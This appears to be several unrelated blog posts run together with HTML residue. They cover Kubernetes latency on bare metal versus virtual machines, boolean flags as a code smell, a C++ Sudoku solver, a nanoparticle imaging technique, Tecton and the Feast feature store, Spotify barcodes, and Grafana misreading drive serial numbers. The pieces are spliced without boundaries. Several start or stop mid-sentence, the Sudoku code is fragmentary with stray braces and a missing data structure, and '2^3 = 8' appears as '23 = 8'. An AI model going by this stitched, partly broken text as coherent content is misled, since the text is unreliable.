href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20" target="_blank">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on LinkedIn</a></p></li></ul></div></div></div>]]>

<p>Are you considering using containers? Do you care about network latency? If so, read on.</p>
<p>Kubernetes is an open-source container platform. It creates a cluster made out of a set of infrastructures. To accomplish things like load balancing and container-to-container communication, Kubernetes relies on both a network overlay inside the cluster and a proxy process called the kube-proxy that runs on each node in the cluster. This post will describe two ways you can have ultra-low latency for containers: physical servers and Kubernetes's new IPTables-based proxy mode.</p>
<h2>Item #1 - Consider Using Physical Servers Rather than Virtual Machines</h2>
<p>Physical servers don't have the hypervisor overhead layer that is common to virtual machines (VMs). As such, running containers directly on Bare Metal (physical servers) should offer you faster performance. But how much of a difference? As it turns out, there is quite a bit of difference.</p>
<p>Here at CenturyLink Cloud, we offer Kubernetes clusters on both VMs and <a href="https://www.ctl.io/bare-metal/">Bare Metal</a> servers. To test network latency, we used the open-source netperf testing utlity that the Kubernetes community <a href="https://github.com/kubernetes/contrib/tree/master/netperf-tester">wrapped up</a> in order to make it easily deployable to a Kubernetes cluster. The test has a client process running inside a Docker container on one host in the cluster, and a server process running inside a Docker container on a different host in the cluster. When comparing VMs to our smallest physical servers (the 4-core option) located in our VA1 data center <strong>we saw a 3x improvement in network latency</strong>. Now, we would like to share how we did these tests and the detailed test results.</p>
<h2>Kubernetes Cluster Creation</h2>
<p>Using the tool <a href="https://www.ctl.io/knowledge-base/container-services/getting-started-with-kubernetes/">found here</a>, we created two Kubernetes clusters on top of the CenturyLink Cloud infrastructure. One cluster was made up of four Bare Metal servers and the other cluster was made up of four VMs.</p>
<p><strong>Commands to Create the Two Clusters</strong></p>
<pre><code>./kube-up.sh -c=k8s-baremetal1 -d=VA1 -m=4 -t=bareMetal
./kube-up.sh -c=k8s-vm1 -d=VA1 -m=4 -t=standard -mem=8 -cpu=4

# Drink coffee and wait around about 15 minutes...
</code></pre><h2>Run the Network Tests</h2>
<p>Next, we needed to perform the network tests. To build the netperf Golang tool, we ran:</p>
<pre><code>git clone https://github.com/kubernetes/contrib/
cd contrib/netperf-tester
godep go build
</code></pre><p>To run the network testing tool, we ran the following test against each cluster.</p>
<p><strong>Note:</strong> This tool uses the kubectl CLI tool to communicate to the Kubernetes cluster in order to run the tests. We ran this command twice, once against each Kubernetes cluster.</p>
<pre><code>./netperf-tester -number 1000
</code></pre><h2>Test Results</h2>
<p>A snippet from the test results looks like this:</p>
<p><strong>Bare Metal Servers</strong>
<img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-physical-servers.png" alt="Physical Servers"></p>
<p><strong>Virtual Machines</strong>
<img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-vm-numbers.png" alt="Virtual Machines"></p>
<h2>Physical vs VMs - Network Latency Histogram</h2>
<p>We then took the full results (1000 measurements on each platform) and created a histogram chart similar to the one above. The results are pretty impressive, around a 3x improvement. Also, you will notice that the jitter (standard deviation) seen in the physical server results is much smaller.</p>
<p><img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-mean-latency.png" alt="Mean Latency"></p>
<p>As you can see, running Kubernetes and containers on the physical machines provides much lower latency than running Kubernetes on virtual machines. If you are running containers, and network latency is important to you, you may want to consider <a href="https://www.ctl.io/bare-metal/">Bare Metal Servers</a> as an option.</p>
<h2>Item #2 - Use Kube-proxy IPTables Mode.</h2>
<p>Regardless of the hardware you choose to run your cluster on, the Kubernetes community has made substantial progress on building out networking services that are both scalable and highly performance-oriented. One recent improvement from the open source community is the re-basing of the kube-proxy process to use IPTables on the host to perform various load-balancing, proxy, and NAT functions. As seen in the diagram below, this change decreased latency as measured by the open-source network testing tool netperf. Latency (measured in microseconds) seen by the older method (called userspace) can be seen in red while the latency of the newer method (called IPTables) can be seen in blue.</p>

<p>Nice work Kubernetes community! If you are a Kubernetes user, nothing is required of you as new Kubernetes clusters now come with IPTables proxy mode enabled by default. If you are running an older version of Kubernetes, consider upgrading.</p>
<h2>Summary</h2>
<p>If you care about ultra low latency networking for containers, consider using physical machines. If you don't care about this, you might want to consider using virtual machines to run your containers as you can scale more incrementally.</p>

<p>In most major code bases, it’s common to have objects with lots of Boolean flags indicating what state they’re in. E.g. is an enemy targeting the player or not? Is it trying to flee or not? If you have a set of mutually exclusive flags an enum can be used instead, but this is often not possible, and doesn’t change much in terms of the downsides.</p>

<p>In my opinion these are code smells. Smells don’t <em>necessarily</em> indicate actual issues, just patterns that are likely to be used incorrectly and thus warrants extra care.</p>

<p>In many cases if you think about how to avoid flags you’re forced change the code in ways that result in clearer code (specifically several simple functions rather than one general function that checks a dozen flags), as well as improved performance due to fewer branches and cache misses. Let me stress that the main gain here is the improved code quality, so don’t be fooled into thinking this is some kind of optimization – better performance is a happy side effect. And yes, there are cases where flags are the clearer option as well (see below).</p>

<h2 id="an-example">An example</h2>

<p>For a somewhat contrived example, consider a game rendering system. Each object in the world has some rendering state associated with it, this would be things like what meshes and materials to use, but also various flags determining how it’s to be rendered.</p>

<p>Let’s say we have a flag called isDynamic, which tells us if the object can move or if it’s static. We can change the flag throughout the life of the object, but when it’s set to false we assume it’s going to be static for some time (so we pay some up-front cost to pre-calculate some acceleration structures that pay off during actual rendering).</p>

<p>Sometimes you want to temporarily toggle rendering for an object so we check this in the renderer as well by adding an isVisible flag.</p>

<p>In addition, the object as a whole may have an isEnabled flag which lets us disable the whole object (physics, animation, rendering all ignore it when it’s not enabled).</p>

<p>Ok, so far we have three flags which means we have 23 = 8 possible combinations of flags, but do we really have eight separate <em>legal</em> states? No! E.g. an object which is not enabled can’t be visible. You could also argue that an object which is disabled or invisible is _neither _dynamic nor static. So we have significantly more <em>possible</em> states than <em>legal</em> states, and it’s very easy to accidentally end up in an illegal state by forgetting to check a flag in one of the many branches throughout the renderer (e.g. perhaps you go down the “isDynamic” branch somewhere for an object which is invisible, thus getting yourself into an inconsistent state). As you add more flags the set of possible states explodes, and it’s common for the interdependencies to be complex and easy to mess up in all the places you have to check.</p>

<h2 id="an-alternative">An alternative</h2>

<p>Instead of storing all these flags, take a step back and think about what the point of each flag is. The isDynamic flag is there to distinguish between dynamic and static objects. A different way of doing this is for the renderer to simply keep an array of dynamic objects and an array of static objects.</p>

<p>The isVisible flag is different. It means the object should be in <em>neither</em> the dynamic or static array. For the whole-object enabled flag we can do something similar, but for each sub-system.</p>

<p>The exact way you avoid any given flag will differ depending on what the purpose of the flag is, but you can usually find a way to avoid it._
        _</p>

<p>So that’s the point of all this? Well the main benefit is that all the code spread out through the renderer can now be simpler. Instead of checking flags for a complicated set of legal states all over the code, we just have completely separate functions for each kind of state. E.g. there’s one method to go through all the static objects and render them, another to go through all the dynamic ones. These functions may call into shared helper functions here and there (to avoid duplication), but if you want to know how dynamic objects get rendered there’s a single place to start reading, and it will be easier to understand because the code is handling fewer cases.</p>

<p>The complexity isn’t entirely gone, it’s just moved. It’s now in methods like “SetVisible”, “SetDynamic” and so on. This is far better, since the complexity is now <em>localized</em>, making it easier to ensure correctness.</p>

<p>A brief note on performance: As we’re now separating things into different arrays to keep the logic clearer, you can often also split the data up across different arrays, which improves the cache locality for the functions that deal with that particular part of the state. For example, objects may use different data if they’re static or dynamic so if you can avoiding have to “step over” the static data in the dynamic code-path that’s going to save lots of cache misses.</p>

<h2 id="what-about-checking-which-state-an-object-is-in">What about checking which state an object is in?</h2>

<p>If you use the proposed scheme most code never actually have to check any per-object flags, because the data already comes pre-sorted to the “processing” code (and is kept sorted by the state transition code). However, there are exceptions. Sometimes you really do want to check what state a specific object is in. This means doing an array lookup for each of the different arrays to see if the object is there.</p>

<p>To make this fast, you could store the index for each array in the object, which gives you fast lookups. This does means you’re still storing state-related information in the object itself (one index per array), but it can be <em>private</em> information so you still get the other benefits - the renderer still doesn’t have to check flags.</p>

<p>Another option is to make sure each object uses the <em>same</em> index in all the arrays it’s in. You generate a unique ID for each object, and use this as the location for the object in all arrays. The obvious way to do this is to allocate MAX_OBJECT_COUNT-sized arrays for all possible states, but that can of course be wasteful (and costly - gaps in the array cost cache misses when traversing). A better way is to use a “sparse array”, which only stores objects that are actually in the array, but still allows O(1) lookup. A hash table is a reasonable backing-store for this, but you can do better if you let your IDs be unique ints with uniform distribution (no need to actually hash anything, use the ID as-is in a <a href="http://sebastiansylvan.com/2013/05/08/robin-hood-hashing-should-be-your-default-hash-table-implementation/">Robin-hood style</a> hash table).</p>

<h2 id="when-not-to-use-this">When not to use this</h2>

<p>I said above that flags are a code smell, not code bugs! There’s plenty of cases where using flags is entirely appropriate. E.g. if you set flags multiple times per frame then the increased cost of moving it between different arrays all the time is likely a bad idea. Also, if you use the sparse array idea above checking a flag is a lot more expensive so if you do this frequently you should probably at least cache the result of this lookup in a flag. Another scenario is if you only have one of something, there’s really no reason to have multiple arrays in that case, since most arrays will be empty. Also, sometimes the added cognitive overhead of multiple arrays just isn’t worth it if the code is trivial. Last but not least, sometimes it’s just damn difficult to figure out how to avoid a flag and spending too much effort jumping through hoops to satisfy some rule of thumb is just dogmatic.</p>

<p>Even if you go with the suggested approach above, you may still need an actual flag to handle the state transitions appropriately. E.g. if you make an object visible after it’s been invisible you probably need to know if you should add it to the dynamic or static array now that it’s visible. The point isn’t to have no flags at all (despite the title), it’s to move the resulting complexity to the code that actually deals with the _state transition_s, instead of spreading (and duplicating) that same complexity all over the code.</p>

<h2 id="more-resources">More resources</h2>

<p>If this approach appeals to you, you really should look into data-oriented design. I’m a fan of this approach (first and foremost consider the data, and how it gets processed, don’t obsess over object identity), but I would advocate moderation. There are often benefits to having some of the state <em>with</em> the object, instead of having everything be implicit based on what component arrays it’s in (in terms of readability, and sometimes even performance). Resist the temptation to be an extremist about this, that’s really no different than the programmer who uses design patterns every chance they get.</p>

<p>Another good intro to this and other things, from a performance perspective is “Code Clinic: How to Write Code the Compiler can Actually Optimize” by Mike Acton at GDC 2014 (available at the GDC vault with membership – you really need to see the talk here though, slides alone aren’t enough).</p>

<p>A few months back I was in an hotel room at 4 am in the morning when the thermostat inexplicably decided to heat my room to 90 degrees Fahrenheit. That woke me up, and since I had nothing to do for a few hours I decided to write a Sudoku solver (because everyone has to write one).</p>

<p>I hadn’t thought about it since then, until I ran across <a href="https://abhinavsarkar.net/posts/fast-sudoku-solver-in-haskell-3/">this post</a> on reddit and decided to run the same puzzles through my solver and see how it did.</p>

<p><strong>The upshot is that I can do all 49151 puzzles from the post above in about 650ms</strong>. For comparison, the Haskell solution referenced above does it in about 35s. We’re using different machines etc. so it’s not the most scientific comparison in the world (but I doubt my PC is 50x faster), and I don’t really know how much of this is C vs Haskell speed and how much of it is my implementation choices so I’m really not trying to rag on their solution or Haskell (in fact, you should read the posts, they’re  well written and I enjoyed reading Haskell again after many years!).</p>

<p>Anyway, since my solution is slightly different, and I haven’t blogged in a long time, this seemed worth writing up.</p>

<p>Before I wrote any code I went to Peter Norvig’s <a href="http://norvig.com/sudoku.html">Sudoko post</a> just because I remember reading it a few years ago and it seemed like a good place to refresh my memory of the Sudoku rules, and some of the terminology. I didn’t follow along with his solution, so ended up with a slightly different way of doing it, but if the method names and terminology seems similar, that’s why.</p>

<h2 id="performance-from-the-start">Performance from the start</h2>

<p>One of the things I wanted to do when playing around with this was to make sure things were written to be fast (the way you write code when working on games, or other performance sensitive code).</p>

<p>One of my pet peeves is the “Premature optimization is the root of all evil”-crowd, where it almost seems as if people write intentionally slow code because giving <em>any</em> consideration to performance while writing the code is “evil”. This is a gross mischaracterization of what Knuth actually said, and it is certainly not how you write fast systems. For fast systems, you have to consider performance up front and throughout - that doesn’t mean you optimize every line of code with a profiler right away, just that you write it with reasonable performance choices.</p>

<h2 id="the-code">The code</h2>

<p>I knew that this was going to involve a lot of brute force searching and copying of the board state, which meant I wanted to keep it simple and without allocations or other overhead (which isn’t needed for this solution). The main data structure looks like this:</p>
<div><div>

  <span>}</span>

  <span>//.... methods go here ...
</span><span></span><span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>First, I have a 9x9 grid of squares, each one contains a 9-bit bitmask of possible digits that this square can contain (thus they are initialized to 9 ones, or <code>0x1FF</code>). I use a <code>uint16_t</code> because it’s the smallest type that fits 9 bits, the top 7 bits are unused). Some other solutions start off by using some abstract “set” data structure, which IMO seems like overkill. It seems fair to assume that most programmers will know (or can learn) how one might use a bit field to represent small sets, but it wouldn’t be hard to wrap that <code>uint16_t</code> in a struct with some set operations on it.</p>

<p>This is the main board state and once each of these bit masks have only one bit set, we are done and have a solution. Note that I assume all digits are zero-based for convenience (i.e. I subtract one when loading, and add one when printing).</p>

<p>Next, and here’s where my solution is a bit different from others I’ve seen, I maintain a “reverse index” for each digit. So for each digit in each “unit” (row, column or 3x3 block), it maintains a bit mask of where that digit is still a possibility. Initially each digit is possible in every location of the unit, so they too are initialized to <code>0x1FF</code>. Having this reverse index means I don’t have to search through all of the “peers” (i.e. squares in the same row, column or block) in order to elimiate a digit - I can directly find which squares need it eliminated. It also means I can easily figure out when a given digit only has one remaining possible location (see further below).</p>

<p>In order to copy this board state, a simple memcpy will do. There are no allocations, and this will all live on the stack during the search.</p>

<p>In a few places below I need to loop over all the set bits in one of these bit masks, so I have this simple macro for that.</p>
<div><div>
<table><tbody><tr><td>
<pre><code data-lang="cpp"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span></code></pre></td>
<td>
<pre><code data-lang="cpp"><span>#define FOREACH_SET_BIT(digit_mask_input, body) { \
</span><span></span>  <span>unsigned</span> <span>long</span> <span>bit_index</span><span>;</span> <span>uint16_t</span> <span>digit_mask</span> <span>=</span> <span>(</span><span>digit_mask_input</span><span>);</span> \
  <span>while</span> <span>(</span><span>_BitScanForward</span><span>(</span><span>&amp;</span><span>bit_index</span><span>,</span> <span>digit_mask</span><span>))</span> <span>{</span> \
    <span>digit_mask</span> <span>&amp;=</span> <span>digit_mask</span><span>-</span><span>1</span><span>;</span> <span>body</span>\
  <span>}</span>\
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p><code>_BitScanForward</code> just gives you the index of the least significant set bit (on MSVC, other compilers have similar intrinsics), and the magic bit fiddling clears the first set bit. Then it runs the loop <code>body</code> with the variable <code>bit_index</code> set to the index of the bit.</p>

<p>The meat of the algorithm is the <code>eliminate</code> method. It takes a location and a set of digits to eliminate and also propagates the contraints flowing from that elimination.</p>

<p>First, we just clear out the right bits in the current square. If we don’t have any remaining digits we have found a contradiction and can early out (this implies that we’ve made a mistake earlier and have to backtrack).</p>

</div>
<p>We also have to update the “reverse index”. To do this we loop through all the bits that we’re eliminating, and for each one we clear out the current coordinate in its bitmasks.</p>

<p>One slightly interesting thing to note here is that I’m intentionally keeping things very simple in terms of abstraction and complexity. I don’t make any attempt to abstract over the “units” or anything like that. Why? Because we only have three kinds of units, not twenty, so it really doesn’t buy you much. Yes, I’m kinda repeating myself three times here (and I will again below), but in return you get code that has fewer layers of abstractions for people to internalize and understand.</p>

<p>Plus, as I mentioned above I wanted to write this with performance in mind from the start. That means not introducing abstractions in the inner loop in order to avoid minor duplication. If two choices are approximately of equal value (each has pros an cons) and one of them is <em>likely</em> to be faster, then pick the likely-to-be-faster one. You still need to measure at some point to see if you were right, but you can often make decent guesses too. So let’s hold off on adding in abstractions until they buy us <em>a lot</em> more in terms of readability.</p>

<p>Anyway, back to the code. At this stage the board state is updated with the elimination, and now we have to handle the consequences of the elimination.</p>

Scientists from the University of Houston and the University of Texas M.D. Anderson Cancer Center have reported in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-020-19678-w&amp;t=ZGVkOWZlYzZiZTdiMjEwZTUwNzdkNzEwZjdlZjFmMDRhNDdiMzE3NCxOdXdPN2NXZA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635077857917452288%2Fimaging-tech-25-nanometers-particles&amp;m=0&amp;ts=1605817305"><i>Nature Communications</i></a> a new optical imaging technology for nanoscale objects, relying upon unscattered light to detect nanoparticles as small as 25 nanometers in diameter.&nbsp;</p><p>The technology, known as PANORAMA, uses a glass slide covered with gold nanodiscs, allowing scientists to monitor changes in the transmission of light and determine the target’s characteristics.</p><p>PANORAMA takes its name from Plasmonic Nano-aperture Label-free Imaging (PlAsmonic NanO-apeRture lAbel-free iMAging), signifying the key characteristics of the technology. PANORAMA can be used to detect, count and determine the size of individual dielectric nanoparticles.</p><p>Wei-Chuan Shih, professor of electrical and computer engineering at UH and corresponding author for the paper, said the smallest transparent object a standard microscope can image is between 100 nanometers and 200 nanometers. &nbsp;That’s mainly because – in addition to being so small – they don’t reflect, absorb or “scatter” enough light, which could allow imaging systems to detect their presence.</p><p>Labeling is another commonly used technique; it requires researchers to know something about the particle they are studying – that a virus has a spike protein, for example – and engineer a way to tag that feature with fluorescent dye or some other method in order to more easily detect the particle.</p><p>“Otherwise, it will appear as invisible as a tiny dust particle under the microscope, because it’s too small to detect,” Shih said.</p><p>Another drawback? Labeling is only useful if researchers already know at least something about the particle they want to study.</p><p>“With PANORAMA, you don’t have to do the labeling,” Shih said. “You can view it directly because PANORAMA does not rely on detecting the scattered light from the nanoparticle.”</p><p>Instead, the system allows observers to detect a transparent target as small as 25 nanometers by monitoring light transmission through the gold nanodisc-covered glass slide. By monitoring changes in the light, they are able to detect the nearby nanoparticles. The optical imaging system is a standard bright-field microscope commonly found in any lab. There is no need for lasers or interferometers which are required in many other label-free imaging technologies.</p><p>“The size limit has not been reached, according to the data. We stopped at 25 nm nanoparticles simply because that is the smallest polystyrene nanoparticle on the market,” Shih said.</p><p>In addition to Shih, researchers involved in the project include Ph.D. students Nareg Ohannesian and Ibrahim Misbah, both with UH, and Dr. Steven H. Lin with the Department of Radiation Oncology at M.D. Anderson Cancer Center.</p><p>–</p><p><i>Header image:&nbsp;Scientists have reported a new optical imaging technology, using a glass side covered with gold nanodiscs that allows them to monitor changes in the transmission of light and determine the characteristics of nanoparticles as small as 25 nanometers in diameter.

<p>Today, we’re excited to announce that Tecton is becoming a core contributor to the <a href="http://feast.dev/">Feast</a> open source feature store, and that Willem Pienaar, creator of Feast, is joining the Tecton team. In other words, we’re strong believers in the Feast project and are investing meaningful resources into its success. We share a joint vision with Willem: enable every organization to operationalize ML at scale by allowing teams to build and deploy features quickly and reliably.</p>



<p>If you’ve been following Tecton, you know that we’re also building our own commercial feature store that’s currently in early access and soon-to-become Generally Available. And this naturally raises a few questions: why invest in two feature stores, and what does this mean for both Feast and the Tecton feature store?</p>







<h2>Making Feature Stores Accessible to Every Organization</h2>



<p>We believe that feature stores are an essential part of the modern ML stack because they solve the hardest problem of productionizing operational ML: getting fresh feature data reliably computed and served into production. As discussed in <a href="https://www.tecton.ai/blog/what-is-a-feature-store/">“What is a Feature Store?”</a>, a feature store solves this problem by managing feature transformation pipelines, storing features, and serving features in production. The Tecton founding team saw the need for a feature store at Uber where we built the Michelangelo project. Similarly, other technology companies like Gojek also realized the importance of feature stores, leading to the development of Feast.</p>



<p>Unfortunately, feature stores have up to now been accessible only to the largest, most sophisticated technology companies that have the skills and resources to build their own infrastructure.</p>



<p>For the rest of the industry, this technology has remained mostly out of reach. Building your own feature store requires dedicated teams of highly skilled engineers and multiple years of development time. Our objective is to change this, and to put feature stores in reach of every organization, regardless of their ML maturity and available commercial resources.</p>







<h2>Freedom to Choose Between Open Source and Commercial Software</h2>



<p>We have seen strong demand for teams to enter the early access program we introduced earlier this year. We’ve partnered with customers ranging from small growth-stage startups to large Fortune 50 companies, across North America and Europe. We now have customers like <a href="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/Atlassian-Case-Study-201006.pdf">Atlassian</a> running at production scale on the Tecton enterprise feature store.</p>



<p>Along the way, we’ve learned that user needs vary significantly based on their level of maturity, size, and resources. Cloud services are preferred by larger teams that are operationalizing ML at scale and need to move fast, offload the burden of managing and updating software, and have guaranteed service levels with enterprise support. On the other hand, open source is highly valued by small ML teams that are just starting out and want to get their hands dirty, and by large organizations that need to customize the software to their specific needs and have the resources and skills to self-manage their ML infrastructure.</p>



<p>Our objective at Tecton is to solve the data problem for Operational ML for all organizations. The Tecton enterprise feature store is only available as a managed cloud service, leaving a gap for organizations that need open source software today. To close the gap, we decided to put significant resources behind Feast. Partnering with the Feast project, our plan is to leverage our existing development efforts in and learnings from Tecton to help make Feast the best open source feature store, both for small teams just starting out and for larger teams that need the flexibility of open source. As strong allies, we’re going to advance the state of the art for feature stores and enable their adoption across the industry.</p>







<h2>Feast: The Leading Open Source Feature Store</h2>



<p>Feast was developed jointly by Gojek and Google Cloud, and <a href="https://cloud.google.com/blog/products/ai-machine-learning/introducing-feast-an-open-source-feature-store-for-machine-learning">first announced</a> about two years ago. Since its initial release in 2019, Feast has grown rapidly, with multiple companies, including Microsoft, Agoda, Farfetch, Postmates and Zulily adopting and/or contributing to the project. Today, the project has more than 1,100 GitHub stars and has been adopted as a <a href="https://www.kubeflow.org/docs/components/feature-store/">component in Kubeflow</a>.</p>



<p>Willem and the Feast contributors have a clear <a href="https://blog.feast.dev/post/a-state-of-feast">vision</a> of where they want to take the project, and that vision is very well aligned with Tecton’s vision.</p>



<p>Feast will remain a completely independent project, <a href="https://lfaidata.foundation/blog/2020/11/10/feast-joins-lf-ai-data-as-new-incubation-project/">managed by the LF AI &amp; Data Foundation</a>. Willem will continue to be fully committed to Feast, and an official maintainer of the project. And of course, Feast continues to welcome new users and contributors.

<h2>Feast and Tecton: Deployment and Support</h2>



<p>Tecton and Feast’s differences are most notable on how they’re deployed and managed: Feast is fully open source and self-managed. Tecton is a fully-managed cloud service and can be deployed into a company’s private VPC, or into a Tecton-provided single-tenant SaaS environment. While Feast got started on GCP and Tecton got started on AWS, both will support GCP, AWS and Azure in 2021.</p>

<h2>Feast and Tecton: Capabilities</h2>



<p>Tecton and Feast have independent roots and were started by different companies. Tecton’s capability set is largely a superset of Feast’s, with a strong focus on fully-fledged transformation support and enterprise capabilities:</p>

<h2>Offering a seamless migration between Tecton and Feast</h2>



<p>Often, the preferences between using a managed enterprise offering and a self-managed open source project change over time. An enterprise using Tecton’s managed offering may eventually require greater customizability and prefer to switch to a custom fork of Feast. Similarly, a small team that got started with Feast may eventually desire the enterprise capability and managed service of Tecton. To simplify transitions, Tecton is committed to providing a simple migration path between both projects. This migration path will eventually be enabled via:</p>



<ul><li><strong><strong>Feature Serving API Parity:</strong></strong> The feature serving APIs will be identical, allowing customers to switch between both feature stores without having to modify the feature store clients. Model training notebooks and prediction services running in production can remain largely unchanged as long as the client points at the new Feature Store backend.</li><li><strong><strong>Feature Definition Parity: </strong></strong>Tecton’s feature definition DSL will be a superset of Feast’s DSL. As a result, Feast feature definitions can seamlessly be applied to a Tecton deployment.</li><li><strong><strong>Feature Store Parity: </strong></strong>Tecton and Feast will support the same offline and online feature storage technologies (e.g. S3, Delta, DynamoDB, Redis etc.) and understand the same storage contract. As a result, no physical data will need to be migrated as customers choose to migrate between both projects.</li></ul>

Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index.

</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

</div><div><p>One of our more peculiar <a href="https://grafana.com/">Grafana</a> dashboards
exists to show more or less point in time SMART data for the disk
drives on a given server (or some of them). We capture this information
in Prometheus for various reasons, and since we have it in <a href="https://prometheus.io/">Prometheus</a> we want to look at it in a more convenient
way than direct <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a>
queries. Also, this lets us easily look at the differences in SMART
metrics between two periods (not all of which are meaningful, of
course). One of the bits of 'SMART' data that we capture is drive
serial numbers and model names (and PCI paths). Recently I added a
Grafana table to display this to the dashboard, and when I did some
of the drive serial numbers displayed in the table as âˆž, the Unicode
infinity symbol.</p>

<p>At first I thought that the Prometheus query we were using had some
problem. Then I looked more closely at the actual serial numbers
in question, which were things like '1801E1098900', and the penny
dropped. Grafana was interpreting these as numbers written in
scientific notation (so '1801 E +1098900' here) and converting them
to extremely large floating point values, which it then displayed
as infinity. This didn't happen with all serial numbers for drives
of this sort, because most of the serial numbers had hex digits in
them other than the one 'E' that triggered parsing these as scientific
notation numbers.</p>

<p>(It was probably happening with some serial numbers that had the
'E' later, such as '17461934E396', but in those cases the result
was less obviously off than an infinity symbol.)</p>

<p>One of the reasons this was surprising to me was that these serial
numbers don't come from the Prometheus metric values, but instead
from labels on the metric. In Prometheus these labels are always
strings, so I tacitly expected Grafana to also always treat them
as strings. Instead Grafana guessed at their type, and apparently
was willing to accept a variation in type from row to row in the
table (since some didn't parse as floating point numbers but were
displayed without error). This is kind of what you want, but it
also kind of surprised me and I'll definitely have to remember it
for the future. <strong>In Grafana tables, it's safest to always set a
type for all rows</strong>.</p>

<p>In current Grafana (we're using 7.3.2 as I write this), the way to
deal with this is to set an explicit type for the table field, or
even for all fields if they're all really strings (as they are for
